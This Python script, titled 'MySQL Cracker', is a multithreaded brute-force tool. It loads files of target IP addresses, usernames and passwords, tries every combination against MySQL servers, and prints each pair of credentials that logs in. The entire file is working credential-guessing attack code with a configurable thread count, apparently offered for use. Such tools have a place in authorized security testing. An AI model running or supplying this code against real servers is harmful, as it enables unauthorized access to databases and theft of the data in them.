import argparse
import sys

import pymysql
import threadpool

THREAD_NUM = 5
DEFAULT_FILE_IP_LIST = "sample/ip.txt"
DEFAULT_FILE_USER_LIST = "sample/id.txt"
DEFAULT_FILE_PW_LIST = "sample/pw.txt"
DEFAULT_PORT = 3306

def load_file(filename: str) -> list[str]:
    try:
        with open(filename, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"Error: File '{filename}' not found.")
        sys.exit(1)

def load_target_ip_list(filename: str = DEFAULT_FILE_IP_LIST) -> list[str]:
    return load_file(filename)

def load_user_list(filename: str = DEFAULT_FILE_USER_LIST) -> list[str]:
    return load_file(filename)

def load_pw_list(filename: str = DEFAULT_FILE_PW_LIST) -> list[str]:
    return load_file(filename)

def action_crack(ip: str, port: int, id: str, pw: str):
    try:
        conn_mysql = pymysql.connect(host=ip, port=port, user=id, passwd=pw, connect_timeout=5)
        
        print(f"Connection success: Target IP:{ip}, Port:{port}, ID:{id}, PW: {pw}")
        conn_mysql.close()
        return True
    except Exception:
        # DEBUG
        #print(f"Connection failed - Target IP:{ip}, Port:{port}, ID: {id}, PW: {pw}")
        return False

def parse_arguments():
    parser = argparse.ArgumentParser(description="MySQL Cracker")
    parser.add_argument("-i", "--ip_file", default=DEFAULT_FILE_IP_LIST, help="File containing IP addresses")
    parser.add_argument("-u", "--user_file", default=DEFAULT_FILE_USER_LIST, help="File containing usernames")
    parser.add_argument("-w", "--pw_file", default=DEFAULT_FILE_PW_LIST, help="File containing passwords")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT, help="MySQL port number")
    parser.add_argument("-t", "--threads", type=int, default=THREAD_NUM, help="Number of threads")
    return parser.parse_args()

def main():
    args = parse_arguments()

    ip_list = load_target_ip_list(args.ip_file)
    user_list = load_user_list(args.user_file)
    pw_list = load_pw_list(args.pw_file)

    pool = threadpool.ThreadPool(args.threads)
    
    tasks = [
        (None, {'ip': ip, 'port': args.port, 'id': user, 'pw': pw}) for ip in ip_list for user in user_list for pw in pw_list
    ]
    
    requests = threadpool.makeRequests(action_crack, tasks)
    
    for req in requests:
        pool.putRequest(req)
    
    pool.wait()
    
if __name__ == "__main__":
    main()